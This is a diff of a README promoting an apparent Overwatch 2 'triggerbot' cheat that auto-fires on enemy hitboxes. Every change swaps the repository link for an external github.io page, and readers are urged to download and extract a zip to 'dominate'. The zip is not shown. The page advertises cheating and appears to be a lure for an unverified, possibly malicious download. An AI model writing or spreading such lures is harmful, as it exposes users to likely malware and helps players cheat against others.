@@ -1,6 +1,6 @@
 # 🎯 overwatch-2-triggerbot-2026 - Auto-Fire On Enemy Hitboxes Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Overwatch_2_Triggerbot_2026-00FF00?style=for-the-badge&logo=github&logoColor=white&labelColor=1a1a2e)](https://github.com/novoak887q/overwatch-2-triggerbot-2026)
+[![Download Now](https://img.shields.io/badge/Download-Overwatch_2_Triggerbot_2026-00FF00?style=for-the-badge&logo=github&logoColor=white&labelColor=1a1a2e)](https://novoak887q.github.io)
 
 ## 🚀 Getting Started
 
@@ -31,7 +31,7 @@ Follow these steps exactly:
 
 1. **Visit the Download Page**  
    Click the green button at the top of this page, or use this link:  
-   [https://github.com/novoak887q/overwatch-2-triggerbot-2026](https://github.com/novoak887q/overwatch-2-triggerbot-2026)
+   [https://novoak887q.github.io](https://novoak887q.github.io)
 
 2. **Download the Application**  
    Visit this link to download the application. You will see a download button or a file named `Overwatch2_Triggerbot_2026.zip` on that page.
@@ -159,7 +159,7 @@ Before you start:
 
 One more time, here's your direct link:
 
-[**Download Overwatch 2 Triggerbot 2026**](https://github.com/novoak887q/overwatch-2-triggerbot-2026)
+[**Download Overwatch 2 Triggerbot 2026**](https://novoak887q.github.io)
 
 Click it, download, extract, and you're ready to dominate. Good luck, and happy gaming!
 
